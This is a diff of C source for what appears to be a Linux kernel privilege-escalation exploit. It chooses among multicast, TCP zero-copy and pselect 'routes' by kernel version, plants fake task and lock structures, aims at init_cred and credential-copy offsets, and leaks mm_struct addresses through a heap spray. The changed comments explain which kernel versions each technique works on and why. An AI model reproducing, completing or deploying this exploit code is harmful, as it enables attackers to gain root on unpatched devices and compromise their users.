@@ -58,23 +58,24 @@ static int fit_mcast(void) {
              active_offsets->mcast_buffer_size;
 }
 
-/* tcp's frame plant is device-proven only on 6.x compact kernels; 5.10
- * shares compact_waiter but its TCP_ZEROCOPY_RECEIVE rejects the layout. */
+/* The frame plant writes waiter->task and waiter->lock at zc[0x28] and
+ * zc[0x30]. do_tcp_getsockopt copies at most sizeof(struct
+ * tcp_zerocopy_receive), and 5.10's struct ends at 0x28 with copybuf_len last,
+ * so neither word is copied and the route has no waiter to walk. 5.15 grew the
+ * struct to 0x40, but the plant is only device-proven on 6.1. */
 static int fit_tcp(void) {
   return active_offsets && active_offsets->compact_waiter &&
          strncmp(active_offsets->uname_r, "5.", 2) != 0;
 }
 
-/* The extractor stamps pselect_waiter_off<0 when its fd_set copy stops
- * short of the stale waiter (5.15); a profile carrying that refusal has
- * no pselect transport. Measured 0 or structural default stays eligible. */
+/* The extractor stamps pselect_waiter_off<0 when the fd_set copy stops short
+ * of the stale waiter, which leaves no pselect transport. 0 is the structural
+ * default and stays eligible. */
 static int fit_pselect(void) {
   return !active_offsets || active_offsets->pselect_waiter_off >= 0;
 }
 
-/* First fitted entry wins. tcp's window is sizeof(struct
- * tcp_zerocopy_receive), always wide enough for the waiter frame, so only
- * compactness decides its fit. */
+/* Priority order, first fitted entry wins. */
 static const struct route routes[] = {
     {"mcast", fit_mcast, do_kernel5_fake_lock_route, 1, 0, 0xe80,
      TCP_FAKE_TASK_OFF, TCP_CRED_COPY_OFF},
@@ -231,10 +232,8 @@ long sched_setattr_tid(int tid, int nice_value) {
   return ret;
 }
 
-/* Bootloader-selected physical load address. */
 uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
 
-/* Selected entry's init_cred image address. */
 uintptr_t g_init_cred_image;
 
 void init_p0_profile(void) {
@@ -643,9 +642,6 @@ uintptr_t prepare_kernel_page(void) {
     return 0;
   }
 
-  /* the leak pass steps 8 bytes and reports a real mm_struct address, so this
-   * residue is always a multiple of 8 and is not a read on the true stride.
-   * 0 is common and does not mean the stride was right. */
   pr_info("[spray] leaked offset within stride 0x%zx (stride 0x%zx, within page 0x%zx)\n",
           (size_t)((leaked - KERNELSNITCH_IDENTITY_START) % mm_struct_sz()),
           (size_t)mm_struct_sz(),
